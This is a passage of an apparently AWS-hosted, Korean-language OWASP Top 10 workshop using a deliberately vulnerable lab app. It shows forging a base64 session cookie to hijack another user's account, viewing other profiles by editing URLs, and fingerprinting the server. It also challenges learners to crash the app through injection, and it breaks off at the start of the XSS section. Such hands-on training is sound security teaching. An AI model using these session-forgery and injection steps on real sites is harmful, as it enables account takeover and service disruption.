![a1-read-app](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a1-read-app.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

**CHALLENGE 1:** 인젠션으로 더 악의적인 일을 할 수 있습니까? 웹 응용 프로그램을 **Shut Down**할 수 있는 적절한 임의 코드를 찾아보세요. 만일 성공하였다면 **502 Gateway Timeout** 오류 페이지를 강사에게 공유합니다.

# A2: Broken Authentication

[OWASP Top Ten](https://owasp.org/www-project-top-ten/) 에 명시된 바와 같이

> 인증 및 세션 관리와 관련된 응용 프로그램 기능은 종종 잘못 구현되어 공격자가 암호, 키 또는 세션 토큰을 손상시키거나 다른 구현 결함을 악용하여 일시적 또는 영구적으로 다른 사용자의 ID를 추측할 수 있습니다.

HTTP의 상태 비저장 특성으로 인해 웹 응용 프로그램에서 [Session Tokens](https://en.wikipedia.org/wiki/Session_ID) 을 사용자 인증 방법으로 사용하는 것이 일반적입니다. 세션 토큰은 사용자가 웹 애플리케이션에 인증될 때마다 생성됩니다. 그런 다음 세션 토큰은 [Browser Cookies](https://en.wikipedia.org/wiki/HTTP_cookie) 를 통해 클라이언트 측에 자주 저장되고 사용자의 신원을 확인하기 위해 해당 요청이 있을 때마다 서버로 다시 전송됩니다.

_약한_ 또는 _예측 가능한_ 방식으로 세션 토큰을 생성하는 것은 시스템의 다른 사용자를 가로채고 가장하려는 공격자에게 취약합니다.

이는 PII 데이터 유출, 악의적인 거래 및 궁극적으로 고객의 신뢰 상실로 이어질 수 있습니다.

이를 시연하기 위해 배포한 웹 응용 프로그램이 세션 토큰을 생성하는 방법을 확인하겠습니다.

1.  웹 애플리케이션 URL을 열고 **OWASP Top 10 Examples**를 클릭하고 **A2: Broken Authentication**을 선택합니다.

![a2-select](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-select.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **username**과 **password**로 로그인하라는 메시지가 표시됩니다. 공격자의 자격 증명(**Username:** badguy **Password:** badguy)으로 로그인을 시도해보겠습니다.

![a2-login](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-login.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  올바른 자격 증명으로 로그인하면 간단한 시작 페이지가 표시됩니다.

![a2-welcome](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-welcome.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  웹 브라우저의 **Developer Tools**를 사용하여 쿠키를 확인합니다. 아래에서 브라우저에 대한 특정 가이드를 선택하여 액세스할 수 있습니다.

-   Mozilla Firefox
-   Google Chrome

Mozilla Firefox의 경우 메뉴 모음에서 **Tools > Browser Tools > Web Developer**로 액세스할 수 있습니다. 개발자 도구가 열리면 **Storage** 탭을 클릭합니다. ![a2-cookies-firefox](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a2-cookies.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  **sessionId**라는 이름의 쿠키가 표시되어야 합니다. 겉보기에는 **base64로 encoded** 문자열로 보입니다. 이 문자열을 해독해 보도록 하겠습니다. 개발자 도구에서 sessionId 값을 복사하고 AWS Cloud9 터미널 창으로 이동한 다음 명령을 입력하여 sessionId를 디코딩합니다.
    

```bash
1
echo <paste the copied sessionId> | base64 -d
```

6.  출력을 자세히 관찰하면 사용자를 인증하는 데 사용되는 **sessionId** 토큰이 해당 시간의 **username**과 **timestamp**를 포함하는 JSON 객체에서 방금 생성되었음을 알 수 있습니다. 현재 이 토큰은 사용자가 로그인한 상태에서 발급되었습니다. 예측할 수 없는 값이 없기 때문에 공격자는 **username** 값을 시스템의 알려진 사용자로 바꿔 자신의 계정을 가로채는 것만으로 악의적인 세션 토큰을 쉽게 만들 수 있습니다.

![a2-b64decode](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-b64decode.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

7.  **john's** 계정을 탈취하겠습니다. 디코딩된 JSON 문자열을 복사하고 **username** 값을 **john**으로 바꾸기만 하면 됩니다. 그런 다음 **base64** 명령을 사용하여 Cloud9의 터미널 창에 다음을 입력하여 인코딩할 수 있습니다.

```bash
1
echo '{"username": "john", "timestamp": "2022-10-19T06:36:22.187271"}' | base64 -w 0
```

8.  이전 단계의 명령은 **john's** 계정을 가로채기 위해 맞춤화된 새로운 base64 세션 토큰을 생성해야 합니다.

![a2-b64encode](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-b64encode.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

9.  이제 인코딩된 값을 복사하고 시작 페이지로 돌아갑니다. 개발자 도구를 사용하여 base64로 인코딩된 문자열을 **sessionId** 쿠키에 붙여넣습니다.

![a2-inject-cookie](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-inject-cookie.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

10.  **새로고침**을 누르고 **John's** 계정에 성공적으로 침입했는지 확인합니다.

![a2-exploit-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a2-exploit-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# A5: Broken Access Control

[OWASP Top Ten](https://owasp.org/www-project-top-ten/) 에 명시된 바와 같이

> 인증된 사용자가 수행할 수 있는 작업에 대한 제한이 제대로 적용되지 않는 경우가 많습니다. 공격자는 이러한 결함을 악용하여 다른 사용자의 계정에 액세스하고, 민감한 파일을 보고, 다른 사용자의 데이터를 수정하고, 액세스 권한을 변경하는 등 무단 기능 및/또는 데이터에 액세스할 수 있습니다.

응용 프로그램과 상호 작용할 때 사용자가 가져야 하는 적절한 액세스 제어를 구현하는 것을 잊는 간단한 실수는 치명적일 수 있습니다. 다음은 "민감한 데이터" 노출의 예입니다.

1.  웹 애플리케이션의 URL을 열고 **OWASP Top 10 Examples**를 클릭하고 **A5: Broken Access Control**을 선택합니다.

![a5-select](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a5-select.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **username**과 **Password**로 로그인하라는 메시지가 표시됩니다. 공격자의 자격 증명(**Username:** badguy **Password:** badguy)으로 로그인을 시도해보도록 하겠습니다. 프로필 페이지로 리다이렉션되어야 합니다.

![a5-profile](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a5-profile.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  웹사이트는 **/owasp/A5/profile/{username}**을 통해 프로필 페이지에 액세스하는 **[Pretty URLs](https://en.wikipedia.org/wiki/Clean_URL) **을 구현합니다. 그런 다음 공격자는 빠른 테스트를 수행할 수 있습니다. 가능한 경우 알려진 사용자 이름 **/owasp/A5/profile/{username}**을 사용하여 URL을 변경하여 다른 사람의 프로필을 시도해 보겠습니다. 적절한 접근 제어 확인 없기때문에 관리자 권한이 없어도 누구나 다른 사람의 프로필을 볼 수 있습니다!

![a5-exploit-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a5-exploit-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

액세스 제어는 비즈니스 로직의 일부이기 때문에 자동 스캔은 이 취약점을 놓치는 경향이 있습니다. 이러한 문제를 식별하고 수정하려면 적절한 상호 검토가 필요합니다.

# A6: 보안 구성 오류

[OWASP Top Ten](https://owasp.org/www-project-top-ten/) 에 명시된 바와 같이

> 보안 구성 오류는 가장 흔히 볼 수 있는 문제입니다. 이는 일반적으로 안전하지 않은 기본 구성, 불완전하거나 임시 구성, 개방형 클라우드 스토리지, 잘못 구성된 HTTP 헤더 및 민감한 정보가 포함된 장황한 오류 메시지의 결과입니다. 모든 운영 체제, 프레임워크, 라이브러리 및 애플리케이션을 안전하게 구성해야 할 뿐만 아니라 적시에 패치/업그레이드해야 합니다.

기본 구성 및 개발 환경별 설정은 공격자가 애플리케이션에 대한 더 많은 정보를 수집할 수 있도록 하는 가장 일반적인 문제입니다. 간단한 예를 살펴보겠습니다.

1.  웹 애플리케이션의 URL을 열고 **OWASP Top 10 Examples**를 클릭하고 **A6: Security Misconfiguration**을 선택합니다.

![a6-select](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a6-select.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  공격자의 첫 번째 업무는 어떤 종류의 플랫폼을 사용하고 있는지 확인하고 해당 정보를 사용하여 잠재적인 악용을 찾는 것입니다. 이 정보를 수집하는 가장 쉬운 방법 중 하나는 **Response Headers**를 사용하는 것입니다. 대부분의 웹 서버는 기본값으로 **Server Header**를 제공합니다. 이것은 모든 HTTP 클라이언트에서 쉽게 얻을 수 정보입니다. Mozilla Firefox에서는 **Tools > Web Developer > Network**를 통해 액세스할 수 있습니다. **Reload**를 클릭하고 서버에서 가져온 항목을 선택합니다. **Server** 헤더의 값이 표시되어야 합니다.

-   Mozilla Firefox
-   Google Chrome

Mozilla Firefox의 경우 메뉴 모음에서 **Tools > Browser Tools > Web Developer** 로 액세스할 수 있습니다. 개발자 도구가 열리면 **Network** 탭을 클릭하고 네트워크 로그에서 항목을 선택합니다. ![a6-server-header](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a6-server-header.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  **[CVE Database](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Werkzeug) **에서 **Werkzeug**에 대한 빠른 검색은 잠재적인 취약점으로 이어질 수 있습니다. 공격자는 이 취약점을 이용하여 악의적인 행위를 시도할 수 있습니다.
    
4.  잘못된 보안 구성의 또 다른 예는 "개발 관련" 구성이 **DEBUG** 모드와 같이 프로덕션에 들어가는 경우입니다. DEBUG 모드는 개발자에게 유용하지만 민감한 정보를 잠재적으로 노출할 수 있는 **Stack Trace**를 제공하므로 프로덕션 환경에서 설정하면 안 됩니다. **non-numerical** 값을 양식에 입력하면 다음과 같은 내용이 표시됩니다.
    

![a6-debug-mode](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a6-debug-mode.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# A7: Cross-Site Scripting (XSS)

[OWASP Top Ten](https://owasp.org/www-project-top-ten/) 에 명시된 바와 같이

> XSS 결함은 애플리케이션이 적절한 유효성 검사 또는 이스케이프 없이 새 웹 페이지에 신뢰할 수 없는 데이터를 포함하거나 HTML 또는 JavaScript를 생성할 수 있는 브라우저 API를 사용하여 사용자 제공 데이터로 기존 웹 페이지를 업데이트할 때마다 발생합니다. XSS를 사용하면 공격자가 피해자의 브라우저에서 스크립트를 실행할 수 있어 사용자 세션을 가로채거나 웹 사이트를 손상시키거나 사용자를 악성 사이트로 리다이렉션할 수 있습니다.

XSS를 사용한 세션 하이재킹 익스플로잇의 예를 살펴보겠습니다.

1.  웹 애플리케이션의 URL을 열고 **OWASP Top 10 Examples**를 클릭하고 **A7: Cross-Site Scripting XSS**를 선택합니다.

![a7-select](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/img/module3/a7-select.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

